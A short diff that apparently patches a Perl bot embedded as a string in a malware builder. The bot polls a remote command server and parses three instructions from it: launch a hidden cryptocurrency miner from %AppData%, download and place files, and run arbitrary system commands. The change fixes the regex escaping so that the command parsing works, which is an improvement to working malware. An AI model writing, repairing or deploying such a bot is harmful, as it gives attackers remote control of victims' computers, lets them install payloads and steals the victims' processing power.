@@ -121,14 +121,14 @@ while(1){
   }
   my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0\');
   my $res = $get->get(\'', $_[0], '\');
-  if($res->decoded_content =~ /miner[(.+),(.+)]/){
+  if($res->decoded_content =~ /miner\[(.+),(.+)\]/){
     system("cd %AppData% && NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
   }
-  if($res->decoded_content =~ /download[(.+),(.+),(.+)]/){
+  if($res->decoded_content =~ /download\[(.+),(.+),(.+)\]/){
     getstore($1, $2);
     system(\'move \' . $2 . \' \' . $3);
   }
-  if($res->decoded_content =~ /system[(.+)]/){
+  if($res->decoded_content =~ /system\[(.+)\]/){
     system($1);
   }
 }';
